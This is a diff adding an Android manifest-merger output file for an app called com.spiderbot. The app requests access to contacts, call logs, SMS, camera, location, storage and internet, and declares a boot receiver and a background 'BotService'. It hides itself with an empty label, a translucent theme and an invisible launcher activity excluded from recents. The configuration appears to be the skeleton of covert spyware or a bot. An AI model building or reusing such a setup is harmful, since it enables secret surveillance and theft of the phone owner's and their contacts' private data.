@@ -1,0 +1,136 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.spiderbot"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="21"
+9        android:targetSdkVersion="34" />
+10
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:4:5-67
+11-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:4:22-64
+12    <uses-permission android:name="android.permission.READ_CONTACTS" />
+12-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:5:5-72
+12-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:5:22-69
+13    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+13-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:6:5-72
+13-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:6:22-69
+14    <uses-permission android:name="android.permission.READ_SMS" />
+14-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:7:5-67
+14-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:7:22-64
+15    <uses-permission android:name="android.permission.CAMERA" />
+15-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:8:5-65
+15-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:8:22-62
+16    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+16-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:9:5-79
+16-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:9:22-76
+17    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+17-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:10:5-81
+17-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:10:22-78
+18    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+18-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:11:5-81
+18-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:11:22-78
+19    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+19-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:12:5-80
+19-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:12:22-77
+20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+20-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:13:5-77
+20-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:13:22-74
+21    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+21-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:14:5-81
+21-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:14:22-78
+22
+23    <permission
+23-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/4692ce45ff4fd8b19e49d2997eeb3154/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
+24        android:name="com.spiderbot.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+24-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/4692ce45ff4fd8b19e49d2997eeb3154/transformed/core-1.9.0/AndroidManifest.xml:23:9-81
+25        android:protectionLevel="signature" />
+25-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/4692ce45ff4fd8b19e49d2997eeb3154/transformed/core-1.9.0/AndroidManifest.xml:24:9-44
+26
+27    <uses-permission android:name="com.spiderbot.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+27-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/4692ce45ff4fd8b19e49d2997eeb3154/transformed/core-1.9.0/AndroidManifest.xml:26:5-97
+27-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/4692ce45ff4fd8b19e49d2997eeb3154/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
+28
+29    <application
+29-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:15:5-35:19
+30        android:allowBackup="true"
+30-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:16:9-35
+31        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+31-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/4692ce45ff4fd8b19e49d2997eeb3154/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
+32        android:debuggable="true"
+33        android:extractNativeLibs="true"
+34        android:label=""
+34-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:17:9-25
+35        android:theme="@android:style/Theme.Translucent.NoTitleBar" >
+35-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:18:9-68
+36        <activity
+36-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:19:9-28:20
+37            android:name="com.spiderbot.MainActivity"
+37-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:19:19-47
+38            android:excludeFromRecents="true"
+38-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:21:13-46
+39            android:exported="true"
+39-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:20:13-36
+40            android:noHistory="true"
+40-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:22:13-37
+41            android:theme="@android:style/Theme.NoDisplay" >
+41-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:23:13-59
+42            <intent-filter>
+42-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:24:13-27:29
+43                <action android:name="android.intent.action.MAIN" />
+43-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:25:17-69
+43-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:25:25-66
+44
+45                <category android:name="android.intent.category.LAUNCHER" />
+45-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:26:17-77
+45-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:26:27-74
+46            </intent-filter>
+47        </activity>
+48
+49        <service
+49-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:29:9-72
+50            android:name="com.spiderbot.BotService"
+50-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:29:18-44
+51            android:exported="false" />
+51-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:29:45-69
+52
+53        <receiver
+53-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:30:9-34:20
+54            android:name="com.spiderbot.BootReceiver"
+54-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:30:19-47
+55            android:exported="true" >
+55-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:30:48-71
+56            <intent-filter>
+56-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:31:13-33:29
+57                <action android:name="android.intent.action.BOOT_COMPLETED" />
+57-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:32:17-79
+57-->/data/data/com.termux/files/home/SpiderBotAPK/app/src/main/AndroidManifest.xml:32:25-76
+58            </intent-filter>
+59        </receiver>
+60
+61        <provider
+61-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:24:9-32:20
+62            android:name="androidx.startup.InitializationProvider"
+62-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:25:13-67
+63            android:authorities="com.spiderbot.androidx-startup"
+63-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:26:13-68
+64            android:exported="false" >
+64-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:27:13-37
+65            <meta-data
+65-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:29:13-31:52
+66                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+66-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:30:17-75
+67                android:value="androidx.startup" />
+67-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/7660dec3681f1440ab295f187309d7d7/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:31:17-49
+68            <meta-data
+68-->[androidx.lifecycle:lifecycle-process:2.4.1] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/5a68edf799c8d73f7d6a5c14c692e924/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:31:13-33:52
+69                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+69-->[androidx.lifecycle:lifecycle-process:2.4.1] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/5a68edf799c8d73f7d6a5c14c692e924/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:32:17-78
+70                android:value="androidx.startup" />
+70-->[androidx.lifecycle:lifecycle-process:2.4.1] /data/data/com.termux/files/home/.gradle/caches/8.10.2/transforms/5a68edf799c8d73f7d6a5c14c692e924/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:33:17-49
+71        </provider>
+72    </application>
+73
+74</manifest>
